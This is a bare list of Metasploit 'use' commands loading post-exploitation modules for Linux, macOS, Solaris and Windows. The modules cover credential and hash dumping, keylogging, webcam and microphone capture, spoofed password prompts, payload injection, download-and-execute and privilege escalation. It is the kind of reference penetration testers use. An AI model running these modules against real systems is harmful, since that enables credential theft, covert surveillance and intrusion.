use post/linux/gather/enum_users_history
use post/linux/gather/enum_xchat
use post/linux/gather/gnome_commander_creds
use post/linux/gather/hashdump
use post/linux/gather/mount_cifs_creds
use post/linux/gather/pptpd_chap_secrets
use post/linux/manage/download_exec
use post/multi/escalate/cups_root_file_read
use post/multi/escalate/metasploit_pcaplog
use post/multi/gather/apple_ios_backup
use post/multi/gather/check_malware
use post/multi/gather/dbvis_enum
use post/multi/gather/dns_bruteforce
use post/multi/gather/dns_reverse_lookup
use post/multi/gather/dns_srv_lookup
use post/multi/gather/enum_vbox
use post/multi/gather/env
use post/multi/gather/fetchmailrc_creds
use post/multi/gather/filezilla_client_cred
use post/multi/gather/find_vmx
use post/multi/gather/firefox_creds
use post/multi/gather/gpg_creds
use post/multi/gather/lastpass_creds
use post/multi/gather/multi_command
use post/multi/gather/netrc_creds
use post/multi/gather/pgpass_creds
use post/multi/gather/pidgin_cred
use post/multi/gather/ping_sweep
use post/multi/gather/remmina_creds
use post/multi/gather/resolve_hosts
use post/multi/gather/rubygems_api_key
use post/multi/gather/run_console_rc_file
use post/multi/gather/skype_enum
use post/multi/gather/ssh_creds
use post/multi/gather/thunderbird_creds
use post/multi/gather/wlan_geolocate
use post/multi/general/close
use post/multi/general/execute
use post/multi/manage/dbvis_add_db_admin
use post/multi/manage/dbvis_query
use post/multi/manage/multi_post
use post/multi/manage/play_youtube
use post/multi/manage/record_mic
use post/multi/manage/shell_to_meterpreter
use post/multi/manage/sudo
use post/multi/manage/system_session
use post/osx/admin/say
use post/osx/capture/keylog_recorder
use post/osx/capture/screen
use post/osx/gather/autologin_password
use post/osx/gather/enum_adium
use post/osx/gather/enum_airport
use post/osx/gather/enum_chicken_vnc_profile
use post/osx/gather/enum_colloquy
use post/osx/gather/enum_keychain
use post/osx/gather/enum_osx
use post/osx/gather/hashdump
use post/osx/gather/password_prompt_spoof
use post/osx/gather/safari_lastsession
use post/osx/manage/mount_share
use post/osx/manage/record_mic
use post/osx/manage/vpn
use post/osx/manage/webcam
use post/solaris/gather/checkvm
use post/solaris/gather/enum_packages
use post/solaris/gather/enum_services
use post/solaris/gather/hashdump
use post/windows/capture/keylog_recorder
use post/windows/capture/lockout_keylogger
use post/windows/escalate/droplnk
use post/windows/escalate/getsystem
use post/windows/escalate/golden_ticket
use post/windows/escalate/ms10_073_kbdlayout
use post/windows/escalate/screen_unlock
use post/windows/gather/arp_scanner
use post/windows/gather/bitcoin_jacker
use post/windows/gather/cachedump
use post/windows/gather/checkvm
use post/windows/gather/credentials/bulletproof_ftp
use post/windows/gather/credentials/coreftp
use post/windows/gather/credentials/credential_collector
use post/windows/gather/credentials/dyndns
use post/windows/gather/credentials/enum_cred_store
use post/windows/gather/credentials/enum_picasa_pwds
use post/windows/gather/credentials/epo_sql
use post/windows/gather/credentials/filezilla_server
use post/windows/gather/credentials/flashfxp
use post/windows/gather/credentials/ftpnavigator
use post/windows/gather/credentials/ftpx
use post/windows/gather/credentials/gpp
use post/windows/gather/credentials/idm
use post/windows/gather/credentials/imail
use post/windows/gather/credentials/imvu
use post/windows/gather/credentials/mcafee_vse_hashdump
use post/windows/gather/credentials/meebo
use post/windows/gather/credentials/mremote
use post/windows/gather/credentials/mssql_local_hashdump
use post/windows/gather/credentials/nimbuzz
use post/windows/gather/credentials/outlook
use post/windows/gather/credentials/razer_synapse
use post/windows/gather/credentials/razorsql
use post/windows/gather/credentials/rdc_manager_creds
use post/windows/gather/credentials/skype
use post/windows/gather/credentials/smartermail
use post/windows/gather/credentials/smartftp
use post/windows/gather/credentials/spark_im
use post/windows/gather/credentials/sso
use post/windows/gather/credentials/steam
use post/windows/gather/credentials/tortoisesvn
use post/windows/gather/credentials/total_commander
use post/windows/gather/credentials/trillian
use post/windows/gather/credentials/vnc
use post/windows/gather/credentials/windows_autologin
use post/windows/gather/credentials/winscp
use post/windows/gather/credentials/wsftp_client
use post/windows/gather/dnscache_dump
use post/windows/gather/dumplinks
use post/windows/gather/enum_ad_computers
use post/windows/gather/enum_ad_service_principal_names
use post/windows/gather/enum_ad_to_wordlist
use post/windows/gather/enum_ad_user_comments
use post/windows/gather/enum_ad_users
use post/windows/gather/enum_applications
use post/windows/gather/enum_artifacts
use post/windows/gather/enum_chrome
use post/windows/gather/enum_computers
use post/windows/gather/enum_db
use post/windows/gather/enum_devices
use post/windows/gather/enum_dirperms
use post/windows/gather/enum_domain
use post/windows/gather/enum_domain_group_users
use post/windows/gather/enum_domain_tokens
use post/windows/gather/enum_domain_users
use post/windows/gather/enum_domains
use post/windows/gather/enum_files
use post/windows/gather/enum_hostfile
use post/windows/gather/enum_ie
use post/windows/gather/enum_logged_on_users
use post/windows/gather/enum_ms_product_keys
use post/windows/gather/enum_muicache
use post/windows/gather/enum_patches
use post/windows/gather/enum_powershell_env
use post/windows/gather/enum_prefetch
use post/windows/gather/enum_proxy
use post/windows/gather/enum_services
use post/windows/gather/enum_shares
use post/windows/gather/enum_snmp
use post/windows/gather/enum_termserv
use post/windows/gather/enum_tokens
use post/windows/gather/enum_tomcat
use post/windows/gather/enum_unattend
use post/windows/gather/file_from_raw_ntfs
use post/windows/gather/forensics/browser_history
use post/windows/gather/forensics/duqu_check
use post/windows/gather/forensics/enum_drives
use post/windows/gather/forensics/imager
use post/windows/gather/forensics/nbd_server
use post/windows/gather/forensics/recovery_files
use post/windows/gather/hashdump
use post/windows/gather/local_admin_search_enum
use post/windows/gather/lsa_secrets
use post/windows/gather/memory_grep
use post/windows/gather/netlm_downgrade
use post/windows/gather/outlook
use post/windows/gather/phish_windows_credentials
use post/windows/gather/resolve_sid
use post/windows/gather/reverse_lookup
use post/windows/gather/screen_spy
use post/windows/gather/smart_hashdump
use post/windows/gather/tcpnetstat
use post/windows/gather/usb_history
use post/windows/gather/win_privs
use post/windows/gather/wmic_command
use post/windows/gather/word_unc_injector
use post/windows/manage/add_user_domain
use post/windows/manage/autoroute
use post/windows/manage/change_password
use post/windows/manage/clone_proxy_settings
use post/windows/manage/delete_user
use post/windows/manage/download_exec
use post/windows/manage/driver_loader
use post/windows/manage/enable_rdp
use post/windows/manage/enable_support_account
use post/windows/manage/ie_proxypac
use post/windows/manage/inject_ca
use post/windows/manage/inject_host
use post/windows/manage/migrate
use post/windows/manage/mssql_local_auth_bypass
use post/windows/manage/multi_meterpreter_inject
use post/windows/manage/nbd_server
use post/windows/manage/payload_inject
use post/windows/manage/portproxy
use post/windows/manage/powershell/exec_powershell
use post/windows/manage/pptp_tunnel
use post/windows/manage/pxeexploit
use post/windows/manage/reflective_dll_inject
use post/windows/manage/remove_ca
use post/windows/manage/remove_host
use post/windows/manage/rpcapd_start
use post/windows/manage/run_as
use post/windows/manage/sdel
use post/windows/manage/smart_migrate
use post/windows/manage/vss_create
use post/windows/manage/vss_list
use post/windows/manage/vss_mount
use post/windows/manage/vss_set_storage
use post/windows/manage/vss_storage
use post/windows/manage/webcam
use post/windows/recon/computer_browser_discovery
use post/windows/recon/outbound_ports
use post/windows/recon/resolve_ip
use post/windows/wlan/wlan_bss_list
use post/windows/wlan/wlan_current_connection
use post/windows/wlan/wlan_disconnect
use post/windows/wlan/wlan_profile

---------------------